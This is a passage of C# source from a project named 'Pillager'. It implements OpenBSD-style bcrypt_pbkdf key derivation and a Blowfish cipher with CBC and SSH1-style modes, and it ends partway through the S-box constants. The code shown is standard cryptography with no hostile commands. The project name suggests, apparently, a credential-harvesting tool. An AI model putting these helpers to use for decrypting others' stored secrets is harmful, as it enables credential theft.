        private byte[] BcryptHash(Blowfish blowfish, byte[] sha2pass, byte[] sha2salt)
        {
            // this code is based on OpenBSD's bcrypt_pbkdf.c
            const int BLOCKSIZE = 8;

            // key expansion
            blowfish.InitializeState();
            blowfish.ExpandState(sha2pass, sha2salt);
            for (int i = 0; i < 64; ++i)
            {
                blowfish.ExpandState(sha2salt);
                blowfish.ExpandState(sha2pass);
            }

            // encryption
            byte[] cdata = (byte[])_bcryptCipherText.Clone();
            for (int i = 0; i < 64; ++i)
            {
                for (int j = 0; j < 32; j += BLOCKSIZE)
                {
                    blowfish.BlockEncrypt(cdata, j, cdata, j);
                }
            }

            // copy out
            for (int i = 0; i < 32; i += 4)
            {
                byte b0 = cdata[i + 0];
                byte b1 = cdata[i + 1];
                byte b2 = cdata[i + 2];
                byte b3 = cdata[i + 3];
                cdata[i + 3] = b0;
                cdata[i + 2] = b1;
                cdata[i + 1] = b2;
                cdata[i + 0] = b3;
            }

            return cdata;
        }

        /// <summary>
        /// bcrypt_pbkdf (pkcs #5 pbkdf2 implementation using the "bcrypt" hash)
        /// </summary>
        /// <param name="pass">password</param>
        /// <param name="salt">salt</param>
        /// <param name="rounds">rounds</param>
        /// <param name="keylen">key length</param>
        /// <returns>key</returns>
        public byte[] BcryptPbkdf(string pass, byte[] salt, uint rounds, int keylen)
        {
            // this code is based on OpenBSD's bcrypt_pbkdf.c

            if (rounds < 1)
            {
                return null;
            }
            if (salt.Length == 0 || keylen <= 0 || keylen > 1024)
            {
                return null;
            }

            byte[] key = new byte[keylen];

            int stride = (keylen + 32 - 1) / 32;
            int amt = (keylen + stride - 1) / stride;

            var blowfish = new Blowfish();
            using (var sha512 = new SHA512CryptoServiceProvider())
            {

                // collapse password
                byte[] passData = Encoding.UTF8.GetBytes(pass);
                byte[] sha2pass = sha512.ComputeHash(passData);

                // generate key, sizeof(out) at a time
                byte[] countsalt = new byte[4];
                for (int count = 1; keylen > 0; ++count)
                {
                    countsalt[0] = (byte)(count >> 24);
                    countsalt[1] = (byte)(count >> 16);
                    countsalt[2] = (byte)(count >> 8);
                    countsalt[3] = (byte)(count);

                    // first round, salt is salt
                    sha512.Initialize();
                    sha512.TransformBlock(salt, 0, salt.Length, null, 0);
                    sha512.TransformFinalBlock(countsalt, 0, countsalt.Length);
                    byte[] sha2salt = sha512.Hash;
                    byte[] tmpout = BcryptHash(blowfish, sha2pass, sha2salt);
                    byte[] output = (byte[])tmpout.Clone();

                    for (uint r = rounds; r > 1; --r)
                    {
                        // subsequent rounds, salt is previous output
                        sha512.Initialize();
                        sha2salt = sha512.ComputeHash(tmpout);
                        tmpout = BcryptHash(blowfish, sha2pass, sha2salt);
                        for (int i = 0; i < output.Length; ++i)
                        {
                            output[i] ^= tmpout[i];
                        }
                    }

                    // pbkdf2 deviation: output the key material non-linearly.
                    amt = Math.Min(amt, keylen);
                    int k;
                    for (k = 0; k < amt; ++k)
                    {
                        int dest = k * stride + (count - 1);
                        if (dest >= key.Length)
                        {
                            break;
                        }
                        key[dest] = output[k];
                    }
                    keylen -= k;
                }
            }

            return key;
        }
    }
}

```

`Pillager/Helper/Blowfish.cs`:

```cs
using System;

namespace Pillager.Helper
{
    public class Blowfish
    {
        private readonly byte[] IV;
        private readonly byte[] enc;
        private readonly byte[] dec;

        private const int BLOCK_SIZE = 8; // bytes in a data-block

        protected readonly uint[] S0;
        protected readonly uint[] S1;
        protected readonly uint[] S2;
        protected readonly uint[] S3;
        protected readonly uint[] P;

        public Blowfish()
        {
            S0 = new uint[256];
            S1 = new uint[256];
            S2 = new uint[256];
            S3 = new uint[256];
            P = new uint[18];
            IV = new byte[8];
            enc = new byte[8];
            dec = new byte[8];
        }
        public void SetIV(byte[] newiv)
        {
            Array.Copy(newiv, 0, IV, 0, IV.Length);
        }

        public void InitializeKey(byte[] key)
        {
            InitializeState();
            ExpandState(key);
        }

        internal static uint GetIntBE(byte[] src, int offset)
        {
            return (((uint)(src[offset]) << 24) |
                    ((uint)(src[offset + 1]) << 16) |
                    ((uint)(src[offset + 2]) << 8) |
                    ((uint)src[offset + 3]));
        }

        internal static void PutIntBE(uint val, byte[] dest, int offset)
        {
            dest[offset] = (byte)((val >> 24) & 0xff);
            dest[offset + 1] = (byte)((val >> 16) & 0xff);
            dest[offset + 2] = (byte)((val >> 8) & 0xff);
            dest[offset + 3] = (byte)(val & 0xff);
        }

        internal static void BlockXor(byte[] src, int s_offset, int len, byte[] dest, int d_offset)
        {
            for (; len > 0; len--)
                dest[d_offset++] ^= src[s_offset++];
        }

        internal void ExpandState(byte[] key)
        {
            int keyLen = key.Length;
            for (int j = 0, i = 0; i < 16 + 2; i++)
            {
                uint temp =
                    (((uint)(key[j]) << 24) |
                    ((uint)(key[(j + 1) % keyLen]) << 16) |
                    ((uint)(key[(j + 2) % keyLen]) << 8) |
                    ((uint)(key[(j + 3) % keyLen])));
                P[i] = P[i] ^ temp;
                j = (j + 4) % keyLen;
            }

            byte[] LR = new byte[8];

            for (int i = 0; i < 16 + 2; i += 2)
            {
                BlockEncrypt(LR, 0, LR, 0);
                P[i] = GetIntBE(LR, 0);
                P[i + 1] = GetIntBE(LR, 4);
            }

            for (int j = 0; j < 256; j += 2)
            {
                BlockEncrypt(LR, 0, LR, 0);
                S0[j] = GetIntBE(LR, 0);
                S0[j + 1] = GetIntBE(LR, 4);
            }
            for (int j = 0; j < 256; j += 2)
            {
                BlockEncrypt(LR, 0, LR, 0);
                S1[j] = GetIntBE(LR, 0);
                S1[j + 1] = GetIntBE(LR, 4);
            }
            for (int j = 0; j < 256; j += 2)
            {
                BlockEncrypt(LR, 0, LR, 0);
                S2[j] = GetIntBE(LR, 0);
                S2[j + 1] = GetIntBE(LR, 4);
            }
            for (int j = 0; j < 256; j += 2)
            {
                BlockEncrypt(LR, 0, LR, 0);
                S3[j] = GetIntBE(LR, 0);
                S3[j + 1] = GetIntBE(LR, 4);
            }
        }

        // used by bcrypt_pbkdf
        internal void ExpandState(byte[] key, byte[] data)
        {
            int keyLen = key.Length;
            for (int j = 0, i = 0; i < 16 + 2; i++)
            {
                uint temp =
                    (((uint)(key[j]) << 24) |
                    ((uint)(key[(j + 1) % keyLen]) << 16) |
                    ((uint)(key[(j + 2) % keyLen]) << 8) |
                    ((uint)(key[(j + 3) % keyLen])));
                P[i] = P[i] ^ temp;
                j = (j + 4) % keyLen;
            }

            byte[] LR = new byte[8];
            int dataIndex = 0;
            int dataLen = data.Length;

            for (int i = 0; i < 16 + 2; i += 2)
            {
                for (int k = 0; k < 8; ++k)
                {
                    LR[k] ^= data[dataIndex];
                    dataIndex = (dataIndex + 1) % dataLen;
                }

                BlockEncrypt(LR, 0, LR, 0);
                P[i] = GetIntBE(LR, 0);
                P[i + 1] = GetIntBE(LR, 4);
            }

            for (int j = 0; j < 256; j += 2)
            {
                for (int k = 0; k < 8; ++k)
                {
                    LR[k] ^= data[dataIndex];
                    dataIndex = (dataIndex + 1) % dataLen;
                }

                BlockEncrypt(LR, 0, LR, 0);
                S0[j] = GetIntBE(LR, 0);
                S0[j + 1] = GetIntBE(LR, 4);
            }
            for (int j = 0; j < 256; j += 2)
            {
                for (int k = 0; k < 8; ++k)
                {
                    LR[k] ^= data[dataIndex];
                    dataIndex = (dataIndex + 1) % dataLen;
                }

                BlockEncrypt(LR, 0, LR, 0);
                S1[j] = GetIntBE(LR, 0);
                S1[j + 1] = GetIntBE(LR, 4);
            }
            for (int j = 0; j < 256; j += 2)
            {
                for (int k = 0; k < 8; ++k)
                {
                    LR[k] ^= data[dataIndex];
                    dataIndex = (dataIndex + 1) % dataLen;
                }

                BlockEncrypt(LR, 0, LR, 0);
                S2[j] = GetIntBE(LR, 0);
                S2[j + 1] = GetIntBE(LR, 4);
            }
            for (int j = 0; j < 256; j += 2)
            {
                for (int k = 0; k < 8; ++k)
                {
                    LR[k] ^= data[dataIndex];
                    dataIndex = (dataIndex + 1) % dataLen;
                }

                BlockEncrypt(LR, 0, LR, 0);
                S3[j] = GetIntBE(LR, 0);
                S3[j + 1] = GetIntBE(LR, 4);
            }
        }

        internal void InitializeState()
        {
            Array.Copy(blowfish_pbox, 0, P, 0, 18);
            Array.Copy(blowfish_sbox, 0, S0, 0, 256);
            Array.Copy(blowfish_sbox, 256, S1, 0, 256);
            Array.Copy(blowfish_sbox, 512, S2, 0, 256);
            Array.Copy(blowfish_sbox, 768, S3, 0, 256);
        }

        public void BlockEncrypt(byte[] input, int inOffset, byte[] output, int outOffset)
        {
            uint L, R;

            L = GetIntBE(input, inOffset);
            R = GetIntBE(input, inOffset + 4);

            L ^= P[0];
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[1]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[2]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[3]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[4]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[5]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[6]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[7]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[8]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[9]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[10]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[11]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[12]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[13]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[14]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[15]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[16]);
            R ^= P[17];

            PutIntBE(R, output, outOffset);
            PutIntBE(L, output, outOffset + 4);
        }

        public void BlockDecrypt(byte[] input, int inOffset, byte[] output, int outOffset)
        {
            uint L, R;

            L = GetIntBE(input, inOffset);
            R = GetIntBE(input, inOffset + 4);

            L ^= P[17];
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[16]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[15]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[14]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[13]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[12]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[11]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[10]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[9]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[8]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[7]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[6]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[5]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[4]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[3]);
            R ^= ((((S0[(int)((L >> 24) & 0xff)] + S1[(int)((L >> 16) & 0xff)]) ^
                S2[(int)((L >> 8) & 0xff)]) + S3[(int)(L & 0xff)]) ^ P[2]);
            L ^= ((((S0[(int)((R >> 24) & 0xff)] + S1[(int)((R >> 16) & 0xff)]) ^
                S2[(int)((R >> 8) & 0xff)]) + S3[(int)(R & 0xff)]) ^ P[1]);
            R ^= P[0];

            PutIntBE(R, output, outOffset);
            PutIntBE(L, output, outOffset + 4);
        }

        public void EncryptSSH1Style(byte[] src, int srcOff, int len, byte[] dest, int destOff)
        {
            int end = srcOff + len;
            int i, j;

            for (int si = srcOff, di = destOff; si < end; si += 8, di += 8)
            {
                for (i = 0; i < 4; i++)
                {
                    j = 3 - i;
                    IV[i] ^= src[si + j];
                    IV[i + 4] ^= src[si + 4 + j];
                }
                BlockEncrypt(IV, 0, IV, 0);
                for (i = 0; i < 4; i++)
                {
                    j = 3 - i;
                    dest[di + i] = IV[j];
                    dest[di + i + 4] = IV[4 + j];
                }
            }
        }

        public void DecryptSSH1Style(byte[] src, int srcOff, int len, byte[] dest, int destOff)
        {
            int end = srcOff + len;
            int i, j;

            for (int si = srcOff, di = destOff; si < end; si += 8, di += 8)
            {
                for (i = 0; i < 4; i++)
                {
                    j = (3 - i);
                    enc[i] = src[si + j];
                    enc[i + 4] = src[si + 4 + j];
                }
                BlockDecrypt(enc, 0, dec, 0);
                for (i = 0; i < 4; i++)
                {
                    j = 3 - i;
                    dest[di + i] = (byte)((IV[j] ^ dec[j]) & 0xff);
                    IV[j] = enc[j];
                    dest[di + i + 4] = (byte)((IV[4 + j] ^ dec[4 + j]) & 0xff);
                    IV[4 + j] = enc[4 + j];
                }
            }
        }

        public void EncryptCBC(byte[] input, int inputOffset, int inputLen, byte[] output, int outputOffset)
        {
            int nBlocks = inputLen / BLOCK_SIZE;
            for (int bc = 0; bc < nBlocks; bc++)
            {
                BlockXor(input, inputOffset, BLOCK_SIZE, IV, 0);
                BlockEncrypt(IV, 0, output, outputOffset);
                Array.Copy(output, outputOffset, IV, 0, BLOCK_SIZE);
                inputOffset += BLOCK_SIZE;
                outputOffset += BLOCK_SIZE;
            }
        }
        public void DecryptCBC(byte[] input, int inputOffset, int inputLen, byte[] output, int outputOffset)
        {
            byte[] tmpBlk = new byte[BLOCK_SIZE];
            int nBlocks = inputLen / BLOCK_SIZE;
            for (int bc = 0; bc < nBlocks; bc++)
            {
                BlockDecrypt(input, inputOffset, tmpBlk, 0);
                for (int i = 0; i < BLOCK_SIZE; i++)
                {
                    tmpBlk[i] ^= IV[i];
                    IV[i] = input[inputOffset + i];
                    output[outputOffset + i] = tmpBlk[i];
                }
                inputOffset += BLOCK_SIZE;
                outputOffset += BLOCK_SIZE;
            }
        }


        private static readonly uint[] blowfish_pbox = new uint[] {
            0x243f6a88, 0x85a308d3, 0x13198a2e, 0x03707344,
            0xa4093822, 0x299f31d0, 0x082efa98, 0xec4e6c89,
            0x452821e6, 0x38d01377, 0xbe5466cf, 0x34e90c6c,
            0xc0ac29b7, 0xc97c50dd, 0x3f84d5b5, 0xb5470917,
            0x9216d5d9, 0x8979fb1b
        };

        private static readonly uint[] blowfish_sbox = new uint[] {
            0xd1310ba6, 0x98dfb5ac, 0x2ffd72db, 0xd01adfb7,
            0xb8e1afed, 0x6a267e96, 0xba7c9045, 0xf12c7f99,
            0x24a19947, 0xb3916cf7, 0x0801f2e2, 0x858efc16,
            0x636920d8, 0x71574e69, 0xa458fea3, 0xf4933d7e,
            0x0d95748f, 0x728eb658, 0x718bcd58, 0x82154aee,
            0x7b54a41d, 0xc25a59b5, 0x9c30d539, 0x2af26013,
            0xc5d1b023, 0x286085f0, 0xca417918, 0xb8db38ef,
            0x8e79dcb0, 0x603a180e, 0x6c9e0e8b, 0xb01e8a3e,
            0xd71577c1, 0xbd314b27, 0x78af2fda, 0x55605c60,
            0xe65525f3, 0xaa55ab94, 0x57489862, 0x63e81440,
            0x55ca396a, 0x2aab10b6, 0xb4cc5c34, 0x1141e8ce,
            0xa15486af, 0x7c72e993, 0xb3ee1411, 0x636fbc2a,
            0x2ba9c55d, 0x741831f6, 0xce5c3e16, 0x9b87931e,
            0xafd6ba33, 0x6c24cf5c, 0x7a325381, 0x28958677,
            0x3b8f4898, 0x6b4bb9af, 0xc4bfe81b, 0x66282193,
            0x61d809cc, 0xfb21a991, 0x487cac60, 0x5dec8032,
            0xef845d5d, 0xe98575b1, 0xdc262302, 0xeb651b88,
            0x23893e81, 0xd396acc5, 0x0f6d6ff3, 0x83f44239,
            0x2e0b4482, 0xa4842004, 0x69c8f04a, 0x9e1f9b5e,
            0x21c66842, 0xf6e96c9a, 0x670c9c61, 0xabd388f0,
            0x6a51a0d2, 0xd8542f68, 0x960fa728, 0xab5133a3,
            0x6eef0b6c, 0x137a3be4, 0xba3bf050, 0x7efb2a98,
            0xa1f1651d, 0x39af0176, 0x66ca593e, 0x82430e88,
            0x8cee8619, 0x456f9fb4, 0x7d84a5c3, 0x3b8b5ebe,
            0xe06f75d8, 0x85c12073, 0x401a449f, 0x56c16aa6,
            0x4ed3aa62, 0x363f7706, 0x1bfedf72, 0x429b023d,
            0x37d0d724, 0xd00a1248, 0xdb0fead3, 0x49f1c09b,
            0x075372c9, 0x80991b7b, 0x25d479d8, 0xf6e8def7,
            0xe3fe501a, 0xb6794c3b, 0x976ce0bd, 0x04c006ba,
            0xc1a94fb6, 0x409f60c4, 0x5e5c9ec2, 0x196a2463,
            0x68fb6faf, 0x3e6c53b5, 0x1339b2eb, 0x3b52ec6f,
            0x6dfc511f, 0x9b30952c, 0xcc814544, 0xaf5ebd09,
            0xbee3d004, 0xde334afd, 0x660f2807, 0x192e4bb3,
            0xc0cba857, 0x45c8740f, 0xd20b5f39, 0xb9d3fbdb,
            0x5579c0bd, 0x1a60320a, 0xd6a100c6, 0x402c7279,
            0x679f25fe, 0xfb1fa3cc, 0x8ea5e9f8, 0xdb3222f8,
            0x3c7516df, 0xfd616b15, 0x2f501ec8, 0xad0552ab,
            0x323db5fa, 0xfd238760, 0x53317b48, 0x3e00df82,
            0x9e5c57bb, 0xca6f8ca0, 0x1a87562e, 0xdf1769db,
            0xd542a8f6, 0x287effc3, 0xac6732c6, 0x8c4f5573,
            0x695b27b0, 0xbbca58c8, 0xe1ffa35d, 0xb8f011a0,
            0x10fa3d98, 0xfd2183b8, 0x4afcb56c, 0x2dd1d35b,
            0x9a53e479, 0xb6f84565, 0xd28e49bc, 0x4bfb9790,
            0xe1ddf2da, 0xa4cb7e33, 0x62fb1341, 0xcee4c6e8,
            0xef20cada, 0x36774c01, 0xd07e9efe, 0x2bf11fb4,
            0x95dbda4d, 0xae909198, 0xeaad8e71, 0x6b93d5a0,
            0xd08ed1d0, 0xafc725e0, 0x8e3c5b2f, 0x8e7594b7,
            0x8ff6e2fb, 0xf2122b64, 0x8888b812, 0x900df01c,
            0x4fad5ea0, 0x688fc31c, 0xd1cff191, 0xb3a8c1ad,
            0x2f2f2218, 0xbe0e1777, 0xea752dfe, 0x8b021fa1,
            0xe5a0cc0f, 0xb56f74e8, 0x18acf3d6, 0xce89e299,
            0xb4a84fe0, 0xfd13e0b7, 0x7cc43b81, 0xd2ada8d9,
            0x165fa266, 0x80957705, 0x93cc7314, 0x211a1477,
            0xe6ad2065, 0x77b5fa86, 0xc75442f5, 0xfb9d35cf,
            0xebcdaf0c, 0x7b3e89a0, 0xd6411bd3, 0xae1e7e49,
            0x00250e2d, 0x2071b35e, 0x226800bb, 0x57b8e0af,
            0x2464369b, 0xf009b91e, 0x5563911d, 0x59dfa6aa,
            0x78c14389, 0xd95a537f, 0x207d5ba2, 0x02e5b9c5,
            0x83260376, 0x6295cfa9, 0x11c81968, 0x4e734a41,
            0xb3472dca, 0x7b14a94a, 0x1b510052, 0x9a532915,
            0xd60f573f, 0xbc9bc6e4, 0x2b60a476, 0x81e67400,
            0x08ba6fb5, 0x571be91f, 0xf296ec6b, 0x2a0dd915,
            0xb6636521, 0xe7b9f9b6, 0xff34052e, 0xc5855664,
            0x53b02d5d, 0xa99f8fa1, 0x08ba4799, 0x6e85076a,
            0x4b7a70e9, 0xb5b32944, 0xdb75092e, 0xc4192623,
            0xad6ea6b0, 0x49a7df7d, 0x9cee60b8, 0x8fedb266,
            0xecaa8c71, 0x699a17ff, 0x5664526c, 0xc2b19ee1,
            0x193602a5, 0x75094c29, 0xa0591340, 0xe4183a3e,
            0x3f54989a, 0x5b429d65, 0x6b8fe4d6, 0x99f73fd6,
            0xa1d29c07, 0xefe830f5, 0x4d2d38e6, 0xf0255dc1,
            0x4cdd2086, 0x8470eb26, 0x6382e9c6, 0x021ecc5e,
            0x09686b3f, 0x3ebaefc9, 0x3c971814, 0x6b6a70a1,
            0x687f3584, 0x52a0e286, 0xb79c5305, 0xaa500737,
            0x3e07841c, 0x7fdeae5c, 0x8e7d44ec, 0x5716f2b8,
            0xb03ada37, 0xf0500c0d, 0xf01c1f04, 0x0200b3ff,
            0xae0cf51a, 0x3cb574b2, 0x25837a58, 0xdc0921bd,
            0xd19113f9, 0x7ca92ff6, 0x94324773, 0x22f54701,
            0x3ae5e581, 0x37c2dadc, 0xc8b57634, 0x9af3dda7,
            0xa9446146, 0x0fd0030e, 0xecc8c73e, 0xa4751e41,
            0xe238cd99, 0x3bea0e2f, 0x3280bba1, 0x183eb331,
            0x4e548b38, 0x4f6db908, 0x6f420d03, 0xf60a04bf,
            0x2cb81290, 0x24977c79, 0x5679b072, 0xbcaf89af,
            0xde9a771f, 0xd9930810, 0xb38bae12, 0xdccf3f2e,
            0x5512721f, 0x2e6b7124, 0x501adde6, 0x9f84cd87,
            0x7a584718, 0x7408da17, 0xbc9f9abc, 0xe94b7d8c,
            0xec7aec3a, 0xdb851dfa, 0x63094366, 0xc464c3d2,
            0xef1c1847, 0x3215d908, 0xdd433b37, 0x24c2ba16,
            0x12a14d43, 0x2a65c451, 0x50940002, 0x133ae4dd,
            0x71dff89e, 0x10314e55, 0x81ac77d6, 0x5f11199b,
            0x043556f1, 0xd7a3c76b, 0x3c11183b, 0x5924a509,
            0xf28fe6ed, 0x97f1fbfa, 0x9ebabf2c, 0x1e153c6e,
            0x86e34570, 0xeae96fb1, 0x860e5e0a, 0x5a3e2ab3,
            0x771fe71c, 0x4e3d06fa, 0x2965dcb9, 0x99e71d0f,
            0x803e89d6, 0x5266c825, 0x2e4cc978, 0x9c10b36a,
            0xc6150eba, 0x94e2ea78, 0xa5fc3c53, 0x1e0a2df4,
            0xf2f74ea7, 0x361d2b3d, 0x1939260f, 0x19c27960,
            0x5223a708, 0xf71312b6, 0xebadfe6e, 0xeac31f66,
            0xe3bc4595, 0xa67bc883, 0xb17f37d1, 0x018cff28,
            0xc332ddef, 0xbe6c5aa5, 0x65582185, 0x68ab9802,
            0xeecea50f, 0xdb2f953b, 0x2aef7dad, 0x5b6e2f84,
            0x1521b628, 0x29076170, 0xecdd4775, 0x619f1510,
            0x13cca830, 0xeb61bd96, 0x0334fe1e, 0xaa0363cf,
            0xb5735c90, 0x4c70a239, 0xd59e9e0b, 0xcbaade14,
            0xeecc86bc, 0x60622ca7, 0x9cab5cab, 0xb2f3846e,
            0x648b1eaf, 0x19bdf0ca, 0xa02369b9, 0x655abb50,
            0x40685a32, 0x3c2ab4b3, 0x319ee9d5, 0xc021b8f7,
            0x9b540b19, 0x875fa099, 0x95f7997e, 0x623d7da8,
            0xf837889a, 0x97e32d77, 0x11ed935f, 0x16681281,
            0x0e358829, 0xc7e61fd6, 0x96dedfa1, 0x7858ba99,
            0x57f584a5, 0x1b227263, 0x9b83c3ff, 0x1ac24696,
            0xcdb30aeb, 0x532e3054, 0x8fd948e4, 0x6dbc3128,
            0x58ebf2ef, 0x34c6ffea, 0xfe28ed61, 0xee7c3c73,
            0x5d4a14d9, 0xe864b7e3, 0x42105d14, 0x203e13e0,
            0x45eee2b6, 0xa3aaabea, 0xdb6c4f15, 0xfacb4fd0,
            0xc742f442, 0xef6abbb5, 0x654f3b1d, 0x41cd2105,
            0xd81e799e, 0x86854dc7, 0xe44b476a, 0x3d816250,
            0xcf62a1f2, 0x5b8d2646, 0xfc8883a0, 0xc1c7b6a3,
            0x7f1524c3, 0x69cb7492, 0x47848a0b, 0x5692b285,
            0x095bbf00, 0xad19489d, 0x1462b174, 0x23820e00,
            0x58428d2a, 0x0c55f5ea, 0x1dadf43e, 0x233f7061,
            0x3372f092, 0x8d937e41, 0xd65fecf1, 0x6c223bdb,
            0x7cde3759, 0xcbee7460, 0x4085f2a7, 0xce77326e,
            0xa6078084, 0x19f8509e, 0xe8efd855, 0x61d99735,
            0xa969a7aa, 0xc50c06c2, 0x5a04abfc, 0x800bcadc,
            0x9e447a2e, 0xc3453484, 0xfdd56705, 0x0e1e9ec9,
            0xdb73dbd3, 0x105588cd, 0x675fda79, 0xe3674340,
            0xc5c43465, 0x713e38d8, 0x3d28f89e, 0xf16dff20,
            0x153e21e7, 0x8fb03d4a, 0xe6e39f2b, 0xdb83adf7,
            0xe93d5a68, 0x948140f7, 0xf64c261c, 0x94692934,
            0x411520f7, 0x7602d4f7, 0xbcf46b2e, 0xd4a20068,
            0xd4082471, 0x3320f46a, 0x43b7d4b7, 0x500061af,
            0x1e39f62e, 0x97244546, 0x14214f74, 0xbf8b8840,
            0x4d95fc1d, 0x96b591af, 0x70f4ddd3, 0x66a02f45,
            0xbfbc09ec, 0x03bd9785, 0x7fac6dd0, 0x31cb8504,
            0x96eb27b3, 0x55fd3941, 0xda2547e6, 0xabca0a9a,
            0x28507825, 0x530429f4, 0x0a2c86da, 0xe9b66dfb,
            0x68dc1462, 0xd7486900, 0x680ec0a4, 0x27a18dee,
            0x4f3ffea2, 0xe887ad8c, 0xb58ce006, 0x7af4d6b6,
            0xaace1e7c, 0xd3375fec, 0xce78a399, 0x406b2a42,
            0x20fe9e35, 0xd9f385b9, 0xee39d7ab, 0x3b124e8b,
            0x1dc9faf7, 0x4b6d1856, 0x26a36631, 0xeae397b2,
            0x3a6efa74, 0xdd5b4332, 0x6841e7f7, 0xca7820fb,
            0xfb0af54e, 0xd8feb397, 0x454056ac, 0xba489527,
            0x55533a3a, 0x20838d87, 0xfe6ba9b7, 0xd096954b,
            0x55a867bc, 0xa1159a58, 0xcca92963, 0x99e1db33,
            0xa62a4a56, 0x3f3125f9, 0x5ef47e1c, 0x9029317c,
            0xfdf8e802, 0x04272f70, 0x80bb155c, 0x05282ce3,
            0x95c11548, 0xe4c66d22, 0x48c1133f, 0xc70f86dc,
            0x07f9c9ee, 0x41041f0f, 0x404779a4, 0x5d886e17,
            0x325f51eb, 0xd59bc0d1, 0xf2bcc18f, 0x41113564,
            0x257b7834, 0x602a9c60, 0xdff8e8a3, 0x1f636c1b,
